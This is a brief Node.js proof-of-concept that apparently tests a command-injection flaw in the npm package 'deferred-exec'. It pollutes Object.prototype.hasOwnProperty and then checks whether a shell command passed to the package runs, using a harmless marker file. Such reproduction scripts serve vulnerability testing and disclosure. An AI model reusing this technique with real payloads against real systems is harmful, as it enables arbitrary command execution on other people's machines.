Object.prototype.hasOwnProperty = () => true;
const a = require('deferred-exec');
const fs = require('fs');
const path = './deferred-exec';
const sleep = require('sleep');
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a(' fsutil file createnew deferred-exec 0 ', {});
sleep.sleep(2);
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});